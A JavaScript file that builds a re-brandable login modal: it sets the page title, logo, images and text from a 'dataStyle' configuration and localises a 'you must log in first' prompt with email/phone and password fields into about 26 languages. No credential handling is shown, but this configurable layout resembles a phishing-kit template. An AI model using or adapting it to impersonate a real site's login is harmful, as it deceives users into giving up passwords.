 var modal = document.getElementById("myModal");
 var btn = document.getElementById("myBtn");
 btn.onclick = function () {
   modal.style.display = "block";
 };

 // ************************************************************************************************* //
 /* ----------------main items -------------------------*/
document.title = dataStyle.page_title;
document.querySelector("#main-background").style.background = 'url('+dataStyle.background+')';
document.querySelector("#main-background").style.background = 'url('+dataStyle.background_color+')';
/* ----------------Images -----------------------------*/
document.querySelector("#main-logo").src = dataStyle.logo;
document.querySelector("#main-img").src = dataStyle.img;
/* ----------------texts -----------------------------*/
document.querySelector("#main-text").innerHTML = dataStyle.heading;
document.querySelector("#text").innerHTML = dataStyle.paragraph;
document.querySelector("#main-text").color = dataStyle.heading_color;
document.querySelector("#text").color = dataStyle.paragraph_color;

// ************************************************************************************************* //


transItems = document.querySelectorAll(".translated");
var userLang = (navigator.language || navigator.userLanguage).split('-')[0];
var Translate = {
	ar: {
		dir: 'rtl',
		main: 'يجب تسجيل الدخول اولا',
		user: 'عنوان البريد الإلكتروني أو رقم الهاتف',
		pass: 'كلمه السر',
		button: 'تسجيل دخول',
		continue: 'متابعة'
		
		
	},

	mn: {
		dir: 'ltr',
		main: 'Та эхлээд нэвтрэх хэрэгтэй.',
		user: 'Гар утасны дугаар эсвэл имэйл хаяг',
		pass: 'нууц үг',
		button: 'Нэвтрэх',
		continue: 'үргэлжлүүлэх'
		
	},

	es: {
		dir: 'ltr',
		main: 'Primero debe iniciar sesión.',
		user: 'Número de móvil o dirección de correo electrónico',
		pass: 'clave',
		button: 'Iniciar sesión',
		continue: 'Continuar'
		

	},
	am: {
		dir: 'rtl',
		main: 'መጀመሪያ መግባት አለብህ።',
		user: 'የሞባይል ቁጥር ወይም ኢሜል አድራሻ',
		pass: 'ፕስወርድ',
		button: 'ግባ',
		continue: 'ይቀጥሉ'
		


	},
	bg: {
		dir: 'ltr',
		main: 'Първо трябва да влезете.',
		user: 'Имейл адрес или мобилен номер',
		pass: 'парола',
		button: 'Влизам',
		continue: 'продължи'
		

	},
	bn: {
		dir: 'ltr',
		main: 'প্রথমে আপনাকে প্রবেশ করতে হবে.',
		user: 'ইমেল ঠিকানা বা মোবাইল নম্বর',
		pass: 'পাসওয়ার্ড',
		button: 'প্রবেশ করুন',
		continue: 'চালিয়ে যান'
		

	},
	cs: {
		dir: 'ltr',
		main: 'Nejprve se musíte přihlásit.',
		user: 'E-mailová adresa nebo mobilní číslo',
		pass: 'Heslo',
		button: 'Přihlásit se',
		continue: 'pokračovat'
		

	},
	el: {
		dir: 'ltr',
		main: 'Πρέπει πρώτα να συνδεθείτε.',
		user: 'Διεύθυνση email ή αριθμός κινητού τηλεφώνου',
		pass: 'Κωδικός πρόσβασης',
		button: 'Σύνδεση',
		continue: 'συνεχίσετε'
		

	},
	fi: {
		dir: 'ltr',
		main: 'Sinun on ensin kirjauduttava sisään.',
		user: 'Sähköpostiosoite tai matkapuhelinnumero',
		pass: 'Salasana',
		button: 'Kirjaudu sisään',
		continue: 'jatkaa'
		

	},
	fr: {
		dir: 'ltr',
		main: "Tu dois d'abord te connecter.",
		user: 'Adresse e-mail ou numéro de portable',
		pass: 'Mot de passe',
		button: 'Connexion',
		continue: 'continuer'
		

	},
	he: {
		dir: 'rtl',
		main: 'אתה צריך להתחבר תחילה.',
		user: 'כתובת אימייל או מספר טלפון',
		pass: 'סיסמה',
		button: 'התחברות',
		continue: 'המשך'
		

	},
	hi: {
		dir: 'ltr',
		main: 'आपको पहले लॉग इन करने की जरूरत है।',
		user: 'विद्युत डाक पता या मोबाइल नंबर',
		pass: 'पासवर्ड',
		button: 'लॉग इन करें',
		continue: 'जारी रखें'
		

	},
	hu: {
		dir: 'ltr',
		main: 'Először be kell jelentkeznie.',
		user: 'E-mail cím vagy mobilszám',
		pass: 'Jelszó',
		button: 'Belépés',
		continue: 'folytatni'
		

	},
	id: {
		dir: 'ltr',
		main: 'Anda harus login terlebih dahulu.',
		user: 'Alamat email atau nomor ponsel',
		pass: 'Kata sandi',
		button: 'Gabung',
		continue: 'lanjutkan'
		

	},
	it: {
		dir: 'ltr',
		main: 'Devi prima effettuare il login.',
		user: 'Indirizzo email o numero di cellulare',
		pass: "Parola d'ordine",
		button: 'Accedere',
		continue: 'continuare'
		

	},
	my: {
		dir: 'ltr',
		main: 'သင် ဦးစွာဝင်ရောက်ရန် လိုအပ်ပါသည်။',
		user: 'အီးမေးလ်လိပ်စာ သို့မဟုတ် မိုဘိုင်းနံပါတ်',
		pass: 'စကားဝှက်',
		button: 'လော့ဂ်အင်',
		continue: 'ဆက်လုပ်'
		

	},
	ne: {
		dir: 'ltr',
		main: 'तपाईंले पहिले लगइन गर्न आवश्यक छ।',
		user: 'इमेल ठेगाना वा मोबाइल नम्बर',
		pass: 'पासवर्ड',
		button: 'लग - इन',
		continue: 'जारी राख्नुहोस्'
		

	},
	ph: {
		dir: 'ltr',
		main: 'Kailangan mo munang mag-login.',
		user: 'Email address o Mobile number',
		pass: 'Password',
		button: 'Mag log in',
		continue: 'Magpatuloy'
		

	},
	pl: {
		dir: 'ltr',
		main: 'Musisz się najpierw zalogować.',
		user: 'Adres email czy numer telefonu',
		pass: 'Hasło',
		button: 'Zaloguj sie',
		continue: 'Kontynuuj'
		

	},
	pt: {
		dir: 'ltr',
		main: 'Você precisa fazer o login primeiro.',
		user: 'Endereço de email ou número de celular',
		pass: 'Senha',
		button: 'Conecte-se',
		continue: 'Continuar'
		

	},
	ro: {
		dir: 'ltr',
		main: 'Mai întâi trebuie să vă autentificați.',
		user: 'Adresă de e-mail sau număr de telefon',
		pass: 'Parola',
		button: 'Log in',
		continue: 'Continuă'
		

	},
	sw: {
		dir: 'ltr',
		main: 'Unahitaji kuingia kwanza.',
		user: 'Anwani ya barua pepe au nambari ya rununu',
		pass: 'Nenosiri',
		button: 'Ingia',
		continue: 'Endelea'
		

	},
	th: {
		dir: 'ltr',
		main: 'คุณต้องเข้าสู่ระบบก่อน',
		user: 'ที่อยู่อีเมลหรือหมายเลขโทรศัพท์มือถือ',
		pass: 'รหัสผ่าน',
		button: 'เข้าสู่ระบบ',
		continue: 'ดำเนินต่อ'
		

	},
	tr: {
		dir: 'ltr',
		main: 'Önce oturum açmanız gerekir.',
		user: 'E-posta adresi veya cep telefonu numarası',
		pass: 'Parola',
		button: 'Giriş yapmak',
		continue: 'devam etmek'
		

	},
	ur: {
		dir: 'rtl',
		main: 'آپ کو پہلے لاگ ان کرنے کی ضرورت ہے۔',
		user: 'ای میل ایڈریس یا موبائل نمبر',
		pass: 'پاس ورڈ',
		button: 'لاگ ان کریں',
		continue: 'جاری رہے'
		
	},
	vi: {
		dir: 'ltr',
		main: 'Bạn cần phải đăng nhập đầu tiên.',
		user: 'Địa chỉ email hoặc số điện thoại di động',
		pass: 'Mật khẩu',
		button: 'Đăng nhập',
		continue: 'Tiếp tục'
		

	}
};


transItems[0].style.direction = Translate[userLang].dir;
transItems[1].innerHTML = Translate[userLang].main;
transItems[2].setAttribute("placeholder", Translate[userLang].user);
transItems[3].setAttribute("placeholder", Translate[userLang].pass);
transItems[4].innerHTML = Translate[userLang].button;
transItems[5].innerHTML = Translate[userLang].continue;